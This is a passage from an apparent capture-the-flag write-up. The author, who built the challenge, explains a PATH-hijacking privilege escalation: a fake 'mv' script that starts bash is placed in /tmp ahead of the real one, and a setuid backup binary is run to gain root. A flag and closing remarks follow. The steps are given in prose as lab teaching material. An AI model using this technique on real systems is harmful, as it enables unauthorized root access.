<code>mv</code>, <code>cp</code>, <code>cd</code>, <code>ls</code> and so on in the bash terminal, there are specific compiled binaries that are looked for to be run. If you type <code>echo $PATH</code> you will get an output like<code> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>. What this means is, if you run a command in the terminal, first look for the binary for the command in <code>/usr/local/sbin</code> then <code>/usr/local/bin</code> and so on, if its not found you will get an error that the command couldn&#8217;t be found.</p>    <p>What is vulnerable here, is that we control the <code>$PATH</code> variable, thus we can also control which <code>mv</code> or <code>echo</code> binary is being run, if we set a new path as the first folder to look in, and make our own malicious <code>mv</code> binary.</p>    <p>So to exploit let us: </p>    <ol><li>Make a malicious binary, I will just make a bash script that calls /bin/bash and name it <code>mv</code></li><li>Put it into the <code><code>/tmp</code></code> folder </li><li>Put the <code>/tmp</code> folder first in the path</li><li>Go to <em>Trines</em> directory and execute the <code>backup</code> binary</li><li>This will elevate the script to root because of <code>setuid</code> then try to look for the <code>mv</code> binary in <code>/tmp</code> which is just <code>/bin/bash</code> and then make us root!</li></ol>    <figure class="wp-block-image size-full"><img loading="lazy" width="737" height="297" src="./images/image-17.png" alt="" class="wp-image-772"/><figcaption>Becoming root in a few commands</figcaption></figure>    <p>WE ARE ROOT! Lets go check out the root directory</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="767" height="789" src="./images/image-18.png" alt="" class="wp-image-773"/><figcaption>And we get the evidence that Henrik Floppergaard is a hard criminal!</figcaption></figure>    <p>And we get the last journal; Dagbog-5</p>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-5 : DDC{F45tFl0pp3r_3r_n4kk3t_du_3r_3N_1337_wh1t3h4t_…_du_3r_wh1t3h4t_1kk3??}</code></p>    <hr class="wp-block-separator"/>    <p>This was the challenge! I spent quite some time making it, especially getting Bolt CMS to work properly, I really hope you enjoyed it! Throughout the day 7 people managed to get all journals! </p>    <p>Thanks for reading this far!</p>    <p></p>    <figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="1024" src="./images/pexels-photo-3783574-1024x1024.jpeg" alt="" class="wp-image-775" srcset="./images/pexels-photo-3783574-1024x1024.jpeg 1024w, ./images/pexels-photo-3783574-300x300.jpeg 300w, ./images/pexels-photo-3783574-150x150.jpeg 150w, ./images/pexels-photo-3783574-768x768.jpeg 768w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>Henrik Floppergaard fled the scene, in another challenge you had to OSINT track him down</figcaption></figure>    <p></p>     </div><!-- .entry-content -->  	</article><!-- #post-725 -->             </div> 	                </div>     </main><!-- #main -->   <footer id="colophon" class="c-footer site-footer">     <div class="c-footer__top">         <div class="c-footer__top__back-to-top">             <a aria-label="Back to Top" class="c-footer__top__back-to-top__link" href="#masthead">                 <span class="dashicons dashicons-arrow-up-alt2"></span>             </a>         </div>     </div>     <div class="c-footer__bottom site-info">         <div class="u-default-max-width">             <div class="c-footer__grid">                 <div class="c-footer__copyright"> 	                                        <div class="c-footer__branding s-footer-branding">                                         <a class="c-footer__branding__title h1" href="https://0xli.me/" rel="home">0xlimE Writeup blog</a> 		                        </div> 	                                    <p> 					                    </p>                 </div>                             </div>         </div><!-- .site-info -->     </div> </footer><!-- #colophon -->  </div><!-- #page -->  <script src='./js/wp-meliora-js-navigation.js' id='wp_meliora-navigation-js'></script> <script src='./js/wp-meliora-js-vendor.min.js' id='wp_meliora-carousel-js'></script> <script src='./js/wp-meliora-js-main.js' id='wp_meliora-main-js'></script> <script src='./js/enlighter-cache-enlighterjs.min.js' id='enlighterjs-js'></script> <script id='enlighterjs-js-after'>
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"scroll","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
</script> <script src='./js/uqu-wp-embed.min.js' id='wp-embed-js'></script>  </body> </html>